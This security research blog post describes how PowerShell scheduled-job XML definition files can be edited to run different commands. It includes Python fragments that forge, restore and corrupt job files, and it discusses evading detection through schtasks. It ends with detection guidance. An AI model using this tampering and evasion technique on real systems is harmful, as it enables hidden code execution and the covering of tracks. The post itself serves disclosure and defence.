+++
title = 'Windows Scheduled Job'
date = 2026-08-25T06:34:30+05:30
draft = false
+++

## Windows Scheduled Job

We mostly see Windows Scheduled Tasks creation, and usually deal with tasks associated with the Task Scheduler service. It utilizes RPC Interface (i.e., `ITaskSchedulerService`) to create, run, and modify them.

However, there is a special part of scheduled tasks that acts like a proxy (using this term for convenience).

In short, ScheduledJob is used to manage scheduled jobs in Windows PowerShell, while PSScheduledJob is the module that provides this functionality.

Starting PowerShell 7, PSCore Team has disabled this module

```bash
PS C:\Program Files\PowerShell\7\Modules\Microsoft.PowerShell.Security> cat "C:\Program Files\PowerShell\7\powershell.config.json"
{
  "Microsoft.PowerShell:ExecutionPolicy": "RemoteSigned",
  "WindowsPowerShellCompatibilityModuleDenyList": [
    "PSScheduledJob",
    "BestPractices",
    "UpdateServices"
  ]
}
```

They added `PSScheduledJob` module in denylist and almost about to remove the code support for it. This may not work in > v7.0, so we’ll be sticking with the older version for now (v5.0)

**Understanding the ScheduledJob**

Let's create a simple scheduled task/job

```bash

PS C:\Users\shark> $trigger = New-JobTrigger -Once -At ((Get-Date).AddMinutes(2))

PS C:\Users\shark> Register-ScheduledJob -Name "shark-job-testing-1"  -Trigger $trigger -ScriptBlock { Start-Process notepad.exe }

Id         Name            JobTriggers     Command                                  Enabled
--         ----            -----------     -------                                  -------
1          shark-job-te... 1                Start-Process notepad.exe               True


```

Once the two-minute timer hits, it launches `notepad.exe` and writes the output details to the following path:

- C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs

Inspect the files:

```bash
sh4rk ScheduledJobs/shark-job-testing-1 >  tree
.
├── Output
│  └── 20260805-085612-972
│                 ├── Results.xml
│                 └── Status.xml
└── ScheduledJobDefinition.xml // definition for this job
```

It creates a subdirectory inside the output folder with the timestamp which further contains the two files i.e. Results and Status.


**Note**

Permission to the directory:

```bash

C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                                        BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                                        SH4RK\shark:(I)(OI)(CI)(F)


```

The user who created the task has full access, so we can modify it? Huh… interesting.

After analysing the configuration file, I found it quite interesting and decided to modify it. I changed a few parameters and found the results even more interesting.

### Intrinsic of ScheduledJob

We will begin with creating a simple task and understand the dynamics of it.

In ScheduledJobDefinition file, we can see the list of values like:

- Invocation Command
- Output File Path
- FilePath

```xml
<InvocationInfo_Command z:Id="38" z:Type="System.String" z:Assembly="0"> 
        Start-Process notepad.exe
</InvocationInfo_Command>
```

```bash
Get-ScheduledJob | fl

InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
Definition             : System.Management.Automation.JobDefinition
Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
Credential             :
JobTriggers            : {1}
Id                     : 1
GlobalId               : 39bf57d3-0b83-4b29-8d19-6792fcd1338e
Name                   : shark-job-testing-1
Command                :  Start-Process notepad.exe
ExecutionHistoryLength : 32
Enabled                : True
PSExecutionPath        : powershell.exe
PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                        [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-job-testing-1
                        ', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"     
```

In the above, we can see the command which is getting pulled from `InvocationInfo_Command`. However, there is one more tag which is more interesting to us.

```xml
<InvocationParam_ScriptBlock
            z:Id="41"
            z:Type="System.String"
            z:Assembly="0"
> Start-Process notepad.exe </InvocationParam_ScriptBlock>
```

While execution, it reads the value from this tag `InvocationParam_ScriptBlock`. So, analysing the  through the terminal may not always give correct output. It would be better to review the file directly rather than relying solely on the command ou

Triggering this task

![Img1](/posts/windows-scheduled-job/img1.png)

Check `Powershell` Operational logs (event ids: 403, 600), if something has been invoked during that timeframe.

```bash
Provider "Registry" is Started. 
...

 HostName=ConsoleHost
 HostVersion=5.1.26100.8972
 HostId=85ea544d-9b28-4284-871f-2679f5147314
 HostApplication=powershell.exe -NoLogo -NonInteractive -WindowStyle Hidden -Command Import-Module PSScheduledJob; $jobDef = [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-job-testing-1', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()
...
```

We can see the parameters:

- Task-Name: `shark-job-testing-1`

Corrupt the xml file and then attempting to either check the status or start the job. It loads the xml file and performs deserialization and during which it throws an error, marks the file as corrupted, and subsequently deletes it during clean up operation.

```bash
Start-Job -DefinitionName 'shark-job-testing-1'
WARNING: A PSScheduledJob job source adapter threw an exception with the following message: Cannot get the
shark-job-testing-1 scheduled job because it is corrupted or in an irresolvable state. Because it cannot run, Windows
PowerShell has deleted shark-job-testing-1 and its results from the computer. To recreate the scheduled job, use the
Register-ScheduledJob cmdlet. For more information about corrupted scheduled jobs, see
about_Scheduled_Jobs_Troubleshooting.
Start-Job : Cannot find a scheduled job with name shark-job-testing-1.
At line:1 char:1
+ Start-Job -DefinitionName 'shark-job-testing-1'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:) [Start-Job], RuntimeException
    + FullyQualifiedErrorId : StartJobFromDefinitionNameNotFound,Microsoft.PowerShell.Commands.StartJobCommand
```

These checks determine whether the file is valid; if any fail, the file is marked as corrupt.

- `FileNotFoundException`
- `SerializationException`
- `System.Runtime.Serialization.InvalidDataContractException`
- `System.Xml.XmlException`
- `System.TypeInitializationException`

Let’s examine these XML files in detail.

- Name: `ScheduledJobDefinition.xml`
- Path: `C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\ScheduledJobDefinition.xml`

```xml
<ScheduledJobDefinition z:Id="1" z:Type="Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.PowerShell.ScheduledJob" xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:x="http://www.w3.org/2001/XMLSchema" xmlns:z="http://schemas.microsoft.com/2003/10/Serialization/"><Options_Member z:Id="2" z:Type="Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" xmlns=""><StartIfOnBatteries_Value z:Id="3" z:Type="System.Boolean" z:Assembly="0">false</StartIfOnBatteries_Value><StopIfGoingOnBatteries_Value z:Id="4" z:Type="System.Boolean" z:Assembly="0">true</StopIfGoingOnBatteries_Value><WakeToRun_Value z:Id="5" z:Type="System.Boolean" z:Assembly="0">false</WakeToRun_Value><StartIfNotIdle_Value z:Id="6" z:Type="System.Boolean" z:Assembly="0">true</StartIfNotIdle_Value><StopIfGoingOffIdle_Value z:Id="7" z:Type="System.Boolean" z:Assembly="0">false</StopIfGoingOffIdle_Value><RestartOnIdleResume_Value z:Id="8" z:Type="System.Boolean" z:Assembly="0">false</RestartOnIdleResume_Value><IdleDuration_Value z:Id="9" z:Type="System.TimeSpan" z:Assembly="0">PT10M</IdleDuration_Value><IdleTimeout_Value z:Id="10" z:Type="System.TimeSpan" z:Assembly="0">PT1H</IdleTimeout_Value><ShowInTaskScheduler_Value z:Id="11" z:Type="System.Boolean" z:Assembly="0">true</ShowInTaskScheduler_Value><RunElevated_Value z:Id="12" z:Type="System.Boolean" z:Assembly="0">false</RunElevated_Value><RunWithoutNetwork_Value z:Id="13" z:Type="System.Boolean" z:Assembly="0">true</RunWithoutNetwork_Value><DoNotAllowDemandStart_Value z:Id="14" z:Type="System.Boolean" z:Assembly="0">false</DoNotAllowDemandStart_Value><TaskMultipleInstancePolicy_Value z:Id="15" z:Type="Microsoft.PowerShell.ScheduledJob.TaskMultipleInstancePolicy" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">IgnoreNew</TaskMultipleInstancePolicy_Value></Options_Member><GlobalId_Member z:Id="16" z:Type="System.String" z:Assembly="0" xmlns="">0e953355-6b96-4f9f-b2e8-49514d03a69f</GlobalId_Member><Name_Member z:Id="17" z:Type="System.String" z:Assembly="0" xmlns="">shark-job-testing-1</Name_Member><HistoryLength_Member z:Id="18" z:Type="System.Int32" z:Assembly="0" xmlns="">32</HistoryLength_Member><Enabled_Member z:Id="19" z:Type="System.Boolean" z:Assembly="0" xmlns="">true</Enabled_Member><Triggers_Member z:Id="20" z:Type="System.Collections.Generic.Dictionary`2[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger, Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]]" z:Assembly="0" xmlns=""><Version z:Id="21" z:Type="System.Int32" z:Assembly="0">1</Version><Comparer z:Id="22" z:Type="System.Collections.Generic.GenericEqualityComparer`1[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]" z:Assembly="0"/><HashSize z:Id="23" z:Type="System.Int32" z:Assembly="0">3</HashSize><KeyValuePairs z:Id="24" z:Type="System.Collections.Generic.KeyValuePair`2[[System.Int32, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger, Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]][]" z:Assembly="0" z:Size="1"><KeyValuePairOfintScheduledJobTrigger0k6IGDQ3 xmlns="http://schemas.datacontract.org/2004/07/System.Collections.Generic"><key>1</key><value z:Id="25" z:Type="Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" xmlns:a="http://schemas.datacontract.org/2004/07/Microsoft.PowerShell.ScheduledJob"><Time_Value z:Id="26" z:Type="System.DateTime" z:Assembly="0" xmlns="">2026-08-19T06:35:27</Time_Value><RepetitionInterval_Value z:Id="27" z:Type="System.TimeSpan" z:Assembly="0" xmlns="">PT0S</RepetitionInterval_Value><RepetitionDuration_Value z:Id="28" z:Type="System.TimeSpan" z:Assembly="0" xmlns="">PT0S</RepetitionDuration_Value><DaysOfWeek_Value i:nil="true" xmlns=""/><RandomDelay_Value z:Id="29" z:Type="System.TimeSpan" z:Assembly="0" xmlns="">PT0S</RandomDelay_Value><Interval_Value z:Id="30" z:Type="System.Int32" z:Assembly="0" xmlns="">1</Interval_Value><User_Value i:nil="true" xmlns=""/><TriggerFrequency_Value z:Id="31" z:Type="Microsoft.PowerShell.ScheduledJob.TriggerFrequency" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" xmlns="">Once</TriggerFrequency_Value><ID_Value z:Id="32" z:Type="System.Int32" z:Assembly="0" xmlns="">1</ID_Value><Enabled_Value z:Id="33" z:Type="System.Boolean" z:Assembly="0" xmlns="">true</Enabled_Value></value></KeyValuePairOfintScheduledJobTrigger0k6IGDQ3></KeyValuePairs></Triggers_Member><CurrentTriggerId_Member z:Id="34" z:Type="System.Int32" z:Assembly="0" xmlns="">1</CurrentTriggerId_Member><FilePath_Member z:Id="35" z:Type="System.String" z:Assembly="0" xmlns="">C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs</FilePath_Member><OutputPath_Member z:Id="36" z:Type="System.String" z:Assembly="0" xmlns="">C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\Output</OutputPath_Member><InvocationInfo_Member z:Id="37" z:Type="Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo" z:Assembly="Microsoft.PowerShell.ScheduledJob, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35" xmlns=""><InvocationInfo_Command z:Id="38" z:Type="System.String" z:Assembly="0">Start-Process notepad.exe</InvocationInfo_Command><InvocationInfo_Name z:Ref="17" i:nil="true"/><InvocationInfo_AdapterType i:nil="true"/><InvocationInfo_ModuleName z:Id="39" z:Type="System.String" z:Assembly="0">PSScheduledJob</InvocationInfo_ModuleName><InvocationInfo_AdapterTypeName z:Id="40" z:Type="System.String" z:Assembly="0">ScheduledJobSourceAdapter</InvocationInfo_AdapterTypeName><InvocationParam_ScriptBlock z:Id="41" z:Type="System.String" z:Assembly="0">Start-Process calc.exe</InvocationParam_ScriptBlock><InvocationParam_FilePath z:Id="42" z:Type="System.String" z:Assembly="0"/><InvocationParam_InitScript z:Ref="42" i:nil="true"/><InvocationParam_RunAs32 z:Id="43" z:Type="System.Boolean" z:Assembly="0">false</InvocationParam_RunAs32><InvocationParam_Authentication z:Id="44" z:Type="System.Management.Automation.Runspaces.AuthenticationMechanism" z:Assembly="System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35">Default</InvocationParam_Authentication><InvocationParam_ArgList i:nil="true"/></InvocationInfo_Member></ScheduledJobDefinition>
```

#### Interesting Ones

- FilePath: It loads the XML file from the JobStore and parses it. Similarly, if we fire up `Start-Job` with a task name, it goes to this path and looks for the file there. If we modify the path, it drops the XML file to the new location.

```xml
<FilePath_Member z:Id="35" z:Type="System.String" z:Assembly="0" xmlns="">C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs</FilePath_Member>
```

- Output: Creates output file to the specified path.

```xml
<OutputPath_Member z:Id="36" z:Type="System.String" z:Assembly="0" xmlns="">C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1\Output</OutputPath_Member>
```

- Task-Name: If we modify the task name and the modified name takes precedence during parsing, it will execute the modified task instead of the original one.

```xml
<Name_Member z:Id="17" z:Type="System.String" z:Assembly="0" xmlns="">shark-job-testing-1</Name_Member>
```

- ScheduledJobSourceAdapter: class that provides functionality for retrieving scheduled job run results from the scheduled job store.

```xml
<InvocationInfo_ModuleName z:Id="39" z:Type="System.String" z:Assembly="0">PSScheduledJob</InvocationInfo_ModuleName>
<InvocationInfo_AdapterTypeName z:Id="40" z:Type="System.String" z:Assembly="0">ScheduledJobSourceAdapter</InvocationInfo_AdapterTypeName>
```

When the job is executed, it internally prepares powershell command and finally calls `invoke` to execute the scriptblock. During command prep, it looks for:

- ScriptBlock (type: ScriptBlock), FilePath (type: string), RunAs32 (type: bool), Authentication (type: enum) ,InitializationScript (type: string) , ArgumentList (type: object)

### Potential Abuse

- Check for the existing tasks i.e. enumerate the folder and obtain the task name.
- Parse the task file and store the previous command line.
- Update it with malicious binary/command.
- Start the Job.
- After execution, revert it.

This case, when a task is already present, we simply modify the existing parameters to execute the malicious binary with Highest RunLevel. Again, Triggering the job manually is not good case. Just tweak it, when the next trigger time hit, it will run.

For this implementation, we will be writing a simple Python script. When the file is being loaded, it undergoes multiple checks, and if the file is messed up, an exception is thrown during deserialization. This forces to delete the task due to file corruption.

You can find the full script at:

- gist link => https://gist.github.com/shark-asmx/3354359d9e2e8aa01e05939f7b294b6b

To create a task, we'll be relying on powershell.exe

```python
 def craft_n_create(self):
  fmt_payload = "{" + f"{self.payload}" + "}"
  payload = f"""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -Command Register-ScheduledJob -Name "{self.job_name}"  -Trigger ( New-JobTrigger -Once -At ((Get-Date).AddMinutes({self.time_bound}))) -ScriptBlock  {fmt_payload};exit"""
  print("[+] Command Executed ", payload)
  out = subprocess.run(payload, capture_output=True)
  print("=" * 50)
  print(out.stdout.decode(), out.stderr.decode())
  print("=" * 50)
```

- Opening the task definition file

```python
import getpass
 def open_task(self):
  username = getpass.getuser()
  self.path = f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\{self.job_name}\\ScheduledJobDefinition.xml"
  self.tree = ET.parse(self.path)
  self.root = self.tree.getroot()
```

- Starting the task

```python
 def start_job(self):
  job_start_cmd = f"""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -Command Start-Job -DefinitionName {self.job_name};Sleep 4;exit"""
  out = subprocess.run(job_start_cmd, capture_output=True)
  print("=" * 50)
  print(out.stdout.decode())
  print("=" * 50)
```

**Note:** The log is generated in the output folder only when the task triggers at its scheduled time. Starting the task manually will not create a log.

```python
 j = TaskCreation()
 j.set_job_name("shark-job-testing-1") 
 j.set_payload('Start-Process notepad.exe') # starts notepad.exe
 j.craft_n_create() # job created
 j.forge_scriptblock("Start-Process calc.exe") # forged to execute calc.exe
 j.start_job() # starts calc.exe
 j.revert_scriptblock() # restored
 j.start_job() #starts notepad.exe
```

Here we go

![Img2](/posts/windows-scheduled-job/img2.png)

### Interesting Findings

Removed all pre-existing tasks for demonstration purposes.

```bash
ls -la C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs
total 8192
drwxrwxrwx 1 Administrators shark  4096 Aug 21 08:05 .
drwxrwxrwx 1 SYSTEM         SYSTEM 4096 Aug 11 00:37 ..
```

Created two new tasks i.e. `shark-benign-job` and `shark-malicious-job` -> (later renamed to `shark-benign-job`)

This stands out: two tasks can share the exact same name. This references the task name directly from the XML file (interesting)

```bash
 Get-ScheduledJob | fl

RunspaceId             : 65593407-674c-4c25-ba90-db9977f281c2
InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
Definition             : System.Management.Automation.JobDefinition
Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
Credential             :
JobTriggers            : {Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger}
Id                     : 21
GlobalId               : 2c4d7a13-f0c5-4bbc-93d0-9af2b2848ca0
Name                   : shark-benign-job
Command                : Start-Process notepad.exe
ExecutionHistoryLength : 32
Enabled                : True
PSExecutionPath        : powershell.exe
PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                         [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-benign-job',
                         'C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"

RunspaceId             : 65593407-674c-4c25-ba90-db9977f281c2
InvocationInfo         : Microsoft.PowerShell.ScheduledJob.ScheduledJobInvocationInfo
Definition             : System.Management.Automation.JobDefinition
Options                : Microsoft.PowerShell.ScheduledJob.ScheduledJobOptions
Credential             :
JobTriggers            : {Microsoft.PowerShell.ScheduledJob.ScheduledJobTrigger}
Id                     : 22
GlobalId               : 2c4d7a13-f0c5-4bbc-93d0-9af2b2848ca0
Name                   : shark-benign-job
Command                : Start-Process notepad.exe
ExecutionHistoryLength : 32
Enabled                : True
PSExecutionPath        : powershell.exe
PSExecutionArgs        : -NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef =
                         [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-benign-job',
                         'C:\Users\heysa\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"
```

This one seems to be more interesting than the previous scenario. The objective was to create a benign job, back up the job, update its parameters, and start it for execution. The file was then corrupted, and the job status was checked, which resulted in the job being removed due to the corruption. The backup was renamed to the original task name and corrupted again, causing the task to be deleted once more.

```python
 j = TaskCreation()
 j.set_job_name('shark-benign-job-x')
 j.set_payload("Start-Process notepad.exe") 
 j.craft_n_create() # job creation
 j.forge_output_path(f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\shark-benign-job-x1\\Output")
 j.backup_prev_task(target_name ='_backup_') # copies the task to backup

 j.forge_output_path(f"C:\\Users\\{username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ScheduledJobs\\shark-benign-job-x\\Output")

 j.forge_name('shark-benign-job') # After creating backup, modified the existing one 
 j.forge_scriptblock('Start-Process cmd.exe') # executes cmd.exe

 j.start_job() # triggering it
 j.corrupt_xml()
 j.start_job() # deletes the job 
 
 time.sleep(4)
 j.restore_it(backup_task="_backup_", targetname="shark-benign-job-x") # abusing the deleted one
 j.corrupt_xml() 
 j.start_job() # deletes the job
```

![Img3](/posts/windows-scheduled-job/img3.png)

These are just few cases; however, many more different cases can be explored with it.

Let see the role of the WTS (Windows Task Scheduler) API. When a scheduled task is created, the Task Scheduler service registers it

Inspecting the previous example

Task: shark-job-testing-1
File-Path: `C:\Windows\System32\Tasks\Microsoft\Windows\PowerShell\ScheduledJobs`

We will find XML file, which is actual Task Scheduler XML file.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <URI>\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1</URI>
    <SecurityDescriptor>D:P(A;;GA;;;SY)(A;;GA;;;BA)(A;;GA;;;S-1-5-21-1046022866-1716163381-3209723860-1001)</SecurityDescriptor>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger id="1">
      <StartBoundary>2026-08-21T11:18:28</StartBoundary>
      <Enabled>true</Enabled>
      <RandomDelay>P0DT0H0M0S</RandomDelay>
    </TimeTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <Duration>P0DT0H10M0S</Duration>
      <WaitTimeout>P0DT1H0M0S</WaitTimeout>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec id="StartPowerShellJob">
      <Command>powershell.exe</Command>
      <Arguments>-NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef = [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-job-testing-1', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"</Arguments>
    </Exec>
  </Actions>
  <Principals>
    <Principal id="Author">
      <UserId>SH4RK\shark</UserId>
      <LogonType>S4U</LogonType>
      <RunLevel>LeastPrivilege</RunLevel>
    </Principal>
  </Principals>
</Task>
```

#### Actual Command Exeuction

```xml
  <Actions Context="Author">
    <Exec id="StartPowerShellJob">
      <Command>powershell.exe</Command>
      <Arguments>-NoLogo -NonInteractive -WindowStyle Hidden -Command "Import-Module PSScheduledJob; $jobDef = [Microsoft.PowerShell.ScheduledJob.ScheduledJobDefinition]::LoadFromStore('shark-job-testing-1', 'C:\Users\shark\AppData\Local\Microsoft\Windows\PowerShell\ScheduledJobs'); $jobDef.Run()"</Arguments>
    </Exec>
```

Querying via schtasks

```bash
Folder: \Microsoft\Windows\PowerShell\ScheduledJobs
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
shark-job-testing-1                      N/A                    Ready
```

##### Running it via schtasks

```bash
 schtasks /run /tn "\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1"
SUCCESS: Attempted to run the scheduled task "\Microsoft\Windows\PowerShell\ScheduledJobs\shark-job-testing-1".
```

This will go and check the corresponding XML, load it, and execute the command. To proxy all the malicious executions, we can target the pre-existing task and abuse it.

From the process execution chain, it looks like this:

```bash

+-------------+     +---------------+       +---------------+     +------------------------------------+
| svchost.exe | ->  | powershell.exe | ->   | powershell.exe | -> | malicious command/binary execution  |
+-------------+     +---------------+       +---------------+     +------------------------------------+

```

One of the coolest ways to evade detection is execution via `schtasks.exe`. Since the target binary is not executing directly from `svchost.exe` (which runs with the `-k netsvc -p -s Schedule` arguments), it originates from lolbin process instead which would be less suspicious.

```bash
- Svchost.exe -> runs with -s Schedule 
- powershell.exe -> runs `Import-Module PSScheduledJob.... $jobDef.Run()`
- powershell.exe -> runs `"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Version 5.1 -s -NoLogo -NoProfile`
- calc.exe 
```

#### Detection Strategy

- Check for the modification of the configuration file i.e. `ScheduledJobDefinition.xml`.
- Review the child process powershell.exe (running with flag `Import-Module PSScheduledJob.... $jobDef.Run()`)
- Analyze Sytem32\Tasks\Microsoft\Windows\PowerShell\ScheduledJobs folder
- Review the XML file to obtain the acutal command.
- If tasks are deleted, check for the `Microsoft-Windows-TaskScheduler/Operational` event ids (i.e. 100, 102, 129, 201, 202)
